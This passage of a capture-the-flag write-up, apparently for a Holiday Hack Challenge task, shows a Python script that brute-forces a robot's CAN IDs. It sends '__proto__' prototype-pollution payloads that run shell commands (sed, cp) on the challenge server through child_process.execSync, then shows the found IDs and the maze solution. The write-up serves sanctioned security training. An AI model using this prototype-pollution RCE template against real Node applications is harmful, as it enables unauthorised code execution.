<span class="normal"><a href="#__codelineno-12-32">32</a></span>
<span class="normal"><a href="#__codelineno-12-33">33</a></span>
<span class="normal"><a href="#__codelineno-12-34">34</a></span>
<span class="normal"><a href="#__codelineno-12-35">35</a></span>
<span class="normal"><a href="#__codelineno-12-36">36</a></span>
<span class="normal"><a href="#__codelineno-12-37">37</a></span>
<span class="normal"><a href="#__codelineno-12-38">38</a></span>
<span class="normal"><a href="#__codelineno-12-39">39</a></span>
<span class="normal"><a href="#__codelineno-12-40">40</a></span>
<span class="normal"><a href="#__codelineno-12-41">41</a></span>
<span class="normal"><a href="#__codelineno-12-42">42</a></span>
<span class="normal"><a href="#__codelineno-12-43">43</a></span>
<span class="normal"><a href="#__codelineno-12-44">44</a></span>
<span class="normal"><a href="#__codelineno-12-45">45</a></span>
<span class="normal"><a href="#__codelineno-12-46">46</a></span>
<span class="normal"><a href="#__codelineno-12-47">47</a></span>
<span class="normal"><a href="#__codelineno-12-48">48</a></span>
<span class="normal"><a href="#__codelineno-12-49">49</a></span>
<span class="normal"><a href="#__codelineno-12-50">50</a></span>
<span class="normal"><a href="#__codelineno-12-51">51</a></span>
<span class="normal"><a href="#__codelineno-12-52">52</a></span>
<span class="normal"><a href="#__codelineno-12-53">53</a></span>
<span class="normal"><a href="#__codelineno-12-54">54</a></span>
<span class="normal"><a href="#__codelineno-12-55">55</a></span>
<span class="normal"><a href="#__codelineno-12-56">56</a></span>
<span class="normal"><a href="#__codelineno-12-57">57</a></span>
<span class="normal"><a href="#__codelineno-12-58">58</a></span>
<span class="normal"><a href="#__codelineno-12-59">59</a></span>
<span class="normal"><a href="#__codelineno-12-60">60</a></span>
<span class="normal"><a href="#__codelineno-12-61">61</a></span>
<span class="normal"><a href="#__codelineno-12-62">62</a></span>
<span class="normal"><a href="#__codelineno-12-63">63</a></span>
<span class="normal"><a href="#__codelineno-12-64">64</a></span>
<span class="normal"><a href="#__codelineno-12-65">65</a></span>
<span class="normal"><a href="#__codelineno-12-66">66</a></span>
<span class="normal"><a href="#__codelineno-12-67">67</a></span>
<span class="normal"><a href="#__codelineno-12-68">68</a></span>
<span class="normal"><a href="#__codelineno-12-69">69</a></span>
<span class="normal"><a href="#__codelineno-12-70">70</a></span>
<span class="normal"><a href="#__codelineno-12-71">71</a></span>
<span class="normal"><a href="#__codelineno-12-72">72</a></span>
<span class="normal"><a href="#__codelineno-12-73">73</a></span>
<span class="normal"><a href="#__codelineno-12-74">74</a></span>
<span class="normal"><a href="#__codelineno-12-75">75</a></span>
<span class="normal"><a href="#__codelineno-12-76">76</a></span>
<span class="normal"><a href="#__codelineno-12-77">77</a></span>
<span class="normal"><a href="#__codelineno-12-78">78</a></span>
<span class="normal"><a href="#__codelineno-12-79">79</a></span>
<span class="normal"><a href="#__codelineno-12-80">80</a></span>
<span class="normal"><a href="#__codelineno-12-81">81</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="ch">#!/usr/bin/env python3</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="c1"># Base URL and headers</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals"</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a>    <span class="s2">"Host"</span><span class="p">:</span> <span class="s2">"hhc25-smartgnomehack-prod.holidayhackchallenge.com"</span><span class="p">,</span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a>    <span class="s2">"Cookie"</span><span class="p">:</span> <span class="s2">"connect.sid=s%3Ar6TrKtH1WpRIbFfK2Ty8sVh9A9ivJs-h.d3CdBPNL</span><span class="si">%2F</span><span class="s2">0HWxFlPph3R7LzzFV3qcKd22qBAGBJI%2B4Q"</span><span class="p">,</span>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a>    <span class="s2">"Accept"</span><span class="p">:</span> <span class="s2">"*/*"</span>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a><span class="p">}</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13"></a><span class="c1"># Command template with placeholder</span>
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14"></a><span class="n">COMMAND_TEMPLATE</span> <span class="o">=</span> <span class="s2">"""{</span>
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15"></a><span class="s2">"action": "update",</span>
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16"></a><span class="s2">"key": "__proto__",</span>
</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17"></a><span class="s2">"subkey": "outputFunctionName",</span>
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18"></a><span class="s2">"value": "x;return global.process.mainModule.require('child_process').execSync('sed -i </span><span class="se">\\</span><span class="s2">"s/0x656/REPLACE_HEX/g</span><span class="se">\\</span><span class="s2">" canbus_client.py').toString(); //"</span>
</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19"></a><span class="s2">}"""</span>
</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20"></a>
</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21"></a><span class="n">COMMAND_COPY</span> <span class="o">=</span> <span class="s2">"""{</span>
</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22"></a><span class="s2">"action": "update",</span>
</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23"></a><span class="s2">"key": "__proto__",</span>
</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24"></a><span class="s2">"subkey": "outputFunctionName",</span>
</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25"></a><span class="s2">"value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client_copy.py canbus_client.py').toString(); //"</span>
</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26"></a><span class="s2">}"""</span>
</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27"></a>
</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28"></a><span class="n">COMMAND_SETUP</span> <span class="o">=</span> <span class="s2">"""{</span>
</span><span id="__span-12-29"><a id="__codelineno-12-29" name="__codelineno-12-29"></a><span class="s2">"action": "update",</span>
</span><span id="__span-12-30"><a id="__codelineno-12-30" name="__codelineno-12-30"></a><span class="s2">"key": "__proto__",</span>
</span><span id="__span-12-31"><a id="__codelineno-12-31" name="__codelineno-12-31"></a><span class="s2">"subkey": "outputFunctionName",</span>
</span><span id="__span-12-32"><a id="__codelineno-12-32" name="__codelineno-12-32"></a><span class="s2">"value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_copy.py').toString(); //"</span>
</span><span id="__span-12-33"><a id="__codelineno-12-33" name="__codelineno-12-33"></a><span class="s2">}"""</span>
</span><span id="__span-12-34"><a id="__codelineno-12-34" name="__codelineno-12-34"></a>
</span><span id="__span-12-35"><a id="__codelineno-12-35" name="__codelineno-12-35"></a><span class="n">COMMAND_BACKUP</span> <span class="o">=</span> <span class="s2">"""{</span>
</span><span id="__span-12-36"><a id="__codelineno-12-36" name="__codelineno-12-36"></a><span class="s2">"action": "update",</span>
</span><span id="__span-12-37"><a id="__codelineno-12-37" name="__codelineno-12-37"></a><span class="s2">"key": "__proto__",</span>
</span><span id="__span-12-38"><a id="__codelineno-12-38" name="__codelineno-12-38"></a><span class="s2">"subkey": "outputFunctionName",</span>
</span><span id="__span-12-39"><a id="__codelineno-12-39" name="__codelineno-12-39"></a><span class="s2">"value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_backup.py').toString(); //"</span>
</span><span id="__span-12-40"><a id="__codelineno-12-40" name="__codelineno-12-40"></a><span class="s2">}"""</span>
</span><span id="__span-12-41"><a id="__codelineno-12-41" name="__codelineno-12-41"></a>
</span><span id="__span-12-42"><a id="__codelineno-12-42" name="__codelineno-12-42"></a><span class="n">COMMAND_TRY</span> <span class="o">=</span> <span class="s2">"""{"action":"move","direction":"up"}"""</span>
</span><span id="__span-12-43"><a id="__codelineno-12-43" name="__codelineno-12-43"></a>
</span><span id="__span-12-44"><a id="__codelineno-12-44" name="__codelineno-12-44"></a><span class="c1"># Setup</span>
</span><span id="__span-12-45"><a id="__codelineno-12-45" name="__codelineno-12-45"></a><span class="n">encoded_command</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">COMMAND_SETUP</span><span class="p">)</span>
</span><span id="__span-12-46"><a id="__codelineno-12-46" name="__codelineno-12-46"></a><span class="c1"># Send the control signal</span>
</span><span id="__span-12-47"><a id="__codelineno-12-47" name="__codelineno-12-47"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">?message=</span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-48"><a id="__codelineno-12-48" name="__codelineno-12-48"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Copied python file, status: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-12-49"><a id="__codelineno-12-49" name="__codelineno-12-49"></a><span class="n">watch_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-50"><a id="__codelineno-12-50" name="__codelineno-12-50"></a>
</span><span id="__span-12-51"><a id="__codelineno-12-51" name="__codelineno-12-51"></a><span class="n">encoded_command</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">COMMAND_BACKUP</span><span class="p">)</span>
</span><span id="__span-12-52"><a id="__codelineno-12-52" name="__codelineno-12-52"></a><span class="c1"># Send the control signal</span>
</span><span id="__span-12-53"><a id="__codelineno-12-53" name="__codelineno-12-53"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">?message=</span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-54"><a id="__codelineno-12-54" name="__codelineno-12-54"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Copied python file, status: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-12-55"><a id="__codelineno-12-55" name="__codelineno-12-55"></a><span class="n">watch_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-56"><a id="__codelineno-12-56" name="__codelineno-12-56"></a>
</span><span id="__span-12-57"><a id="__codelineno-12-57" name="__codelineno-12-57"></a><span class="c1"># Loop over hex values 0x000 to 0x999</span>
</span><span id="__span-12-58"><a id="__codelineno-12-58" name="__codelineno-12-58"></a><span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="mh">0x99A</span><span class="p">):</span>
</span><span id="__span-12-59"><a id="__codelineno-12-59" name="__codelineno-12-59"></a>    <span class="c1"># Copy python script for fresh version</span>
</span><span id="__span-12-60"><a id="__codelineno-12-60" name="__codelineno-12-60"></a>    <span class="n">encoded_command</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">COMMAND_COPY</span><span class="p">)</span>
</span><span id="__span-12-61"><a id="__codelineno-12-61" name="__codelineno-12-61"></a>    <span class="c1"># Send the control signal</span>
</span><span id="__span-12-62"><a id="__codelineno-12-62" name="__codelineno-12-62"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">?message=</span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-63"><a id="__codelineno-12-63" name="__codelineno-12-63"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Copied python file, status: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-12-64"><a id="__codelineno-12-64" name="__codelineno-12-64"></a>    <span class="n">watch_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-65"><a id="__codelineno-12-65" name="__codelineno-12-65"></a>
</span><span id="__span-12-66"><a id="__codelineno-12-66" name="__codelineno-12-66"></a>    <span class="c1"># Change hex value for 'up'</span>
</span><span id="__span-12-67"><a id="__codelineno-12-67" name="__codelineno-12-67"></a>    <span class="n">hexval</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"0x</span><span class="si">{</span><span class="n">n</span><span class="si">:</span><span class="s2">03x</span><span class="si">}</span><span class="s2">"</span>
</span><span id="__span-12-68"><a id="__codelineno-12-68" name="__codelineno-12-68"></a>    <span class="n">command</span> <span class="o">=</span> <span class="n">COMMAND_TEMPLATE</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"REPLACE_HEX"</span><span class="p">,</span> <span class="n">hexval</span><span class="p">)</span>
</span><span id="__span-12-69"><a id="__codelineno-12-69" name="__codelineno-12-69"></a>    <span class="n">encoded_command</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
</span><span id="__span-12-70"><a id="__codelineno-12-70" name="__codelineno-12-70"></a>    <span class="c1"># Send the control signal</span>
</span><span id="__span-12-71"><a id="__codelineno-12-71" name="__codelineno-12-71"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">?message=</span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-72"><a id="__codelineno-12-72" name="__codelineno-12-72"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sent </span><span class="si">{</span><span class="n">hexval</span><span class="si">}</span><span class="s2">, status: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-12-73"><a id="__codelineno-12-73" name="__codelineno-12-73"></a>    <span class="n">watch_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-74"><a id="__codelineno-12-74" name="__codelineno-12-74"></a>
</span><span id="__span-12-75"><a id="__codelineno-12-75" name="__codelineno-12-75"></a>    <span class="c1"># Try 'up' command</span>
</span><span id="__span-12-76"><a id="__codelineno-12-76" name="__codelineno-12-76"></a>    <span class="n">encoded_command</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">COMMAND_TRY</span><span class="p">)</span>
</span><span id="__span-12-77"><a id="__codelineno-12-77" name="__codelineno-12-77"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">?message=</span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-78"><a id="__codelineno-12-78" name="__codelineno-12-78"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Tried 'up' command, status: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-12-79"><a id="__codelineno-12-79" name="__codelineno-12-79"></a>    <span class="n">watch_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
</span><span id="__span-12-80"><a id="__codelineno-12-80" name="__codelineno-12-80"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Watching output, length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">watch_resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-12-81"><a id="__codelineno-12-81" name="__codelineno-12-81"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
</span></code></pre></div></td></tr></tbody></table></div>
</details>
<details class="success">
<summary>CAN IDs</summary>
<p>Using the script, we find the following CAN IDs for moving the robot:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>0x201
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>0x202
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>0x203
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>0x204
</span></code></pre></div>
</details>
<h3 id="maze">Maze<a class="headerlink" href="#maze" title="Permanent link">¶</a></h3>
<p>The final step involves moving the robot through the maze with boxes. We can push boxes forward to create a path.</p>
<details class="success">
<summary>Maze</summary>
<p>We can create the following path to get to the control box and solve the challenge:</p>
<figure>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../media/hack_a_gnome/hack_a_gnome_done" data-desc-position="bottom"><img alt="answer" src="../../media/hack_a_gnome/hack_a_gnome_done"></a></p>
<figcaption>
<p>Path through maze.</p>
</figcaption>
</figure>
</details>
<h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">¶</a></h2>
<div class="admonition quote">
<p class="admonition-title">Chris Davis</p>
<p>Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.</p>
<p>Time to turn this little rebel against its own manufacturing operation and shut them down for good!</p>
</div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.path", "navigation.sections", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
    
  
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>